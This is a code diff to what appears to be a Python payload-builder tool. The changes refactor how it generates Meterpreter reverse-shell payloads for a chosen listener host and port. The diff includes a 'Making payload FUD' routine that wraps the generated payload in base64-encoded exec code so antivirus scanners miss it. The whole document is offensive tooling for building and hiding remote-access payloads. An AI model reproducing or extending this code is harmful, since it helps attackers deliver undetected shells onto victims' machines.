@@ -10,8 +10,10 @@ import time
 
 from colorama.ansi import Fore
 
-
-
+# Dev: SlickPunk666 (slick-punk)
+# Maintainer: SlickPunk666 (slick-punk)
+# Helped By: SlickPunk666 (slick-punk)
+# Bug Fixer: SlickPunk666 (slick-punk)
 banner= ('''
 @@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
 @@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
@@ -114,7 +116,9 @@ def payloadgen3(payload, outfile, args1, args2):
     global lhost, lport, outfiley
     clearscreen()    
     lask()
-    outfile = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({outfiley}){colorama.Fore.BLUE}: ")
+    outfiley = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({outfiley}){colorama.Fore.BLUE}: ")
+    if outfiley != '':
+        outfile = outfiley
     asktb()
     print(f"{colorama.Fore.LIGHTCYAN_EX}Generating {payload} Payload...{colorama.Style.RESET_ALL}")  
     payloadgen2(payload, lhost, lport, outfile, args1, args2)
@@ -149,35 +153,30 @@ def pythonpayload():
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputpy} is not valid" + colorama.Style.RESET_ALL) 
         time.sleep(2)
         pythonpayload() 
-    lask()
-    inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}.py){colorama.Fore.BLUE}: ")
-    asktb()
-    if inputpy2.strip() != "":
-        pyoutfile = inputpy2
     #generate simple payload    
     if inputpy == "1":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
-        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, None, None)
+        payloadgen3(f"python/meterpreter/reverse_{talkbackm1}", pyoutfile, None, None)
         time.sleep(2)
     #PYFUD starts here     
     elif inputpy == "2": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
-        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile + ".tmp", None, None)
+        payloadgen3(f"python/meterpreter/reverse_{talkbackm1}", pyoutfile + ".tmp", None, None)
         pythonpayloadfud()
     elif inputpy == "e":
         main()    
 def pythonpayloadfud():
-    print("Making payload FUD...")
-    pytempf = open(pyoutfile + ".tmp", "r")
-    dat1 = pytempf.readline()
+    print(f"\n{colorama.Style.BRIGHT}Making payload FUD...{colorama.Style.RESET_ALL}")
+    with open(pyoutfile + ".tmp", "r") as pytempf:
+        dat1 = pytempf.readline()
     #part of file b4 base64 code
     b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
     #part of file after
     afb64 = "')[0]))"
     b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
-    pytempf.close()
+
     pycode = base64.b64decode(b64pycode)
     #print(pycode)
     splpycode = pycode.decode().split("\n")
@@ -191,9 +190,8 @@ def pythonpayloadfud():
     finalcode = ''.join(pycodeembedlist)  
     finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
     outpy = (b4b64 + str(finalcodeb64) + afb64)
-    file = open(pyoutfile, "w")
-    file.write(outpy)
-    file.close
+    with open(pyoutfile, "w") as file:
+        file.write(outpy)
     print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
     input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)   
     n = 1  
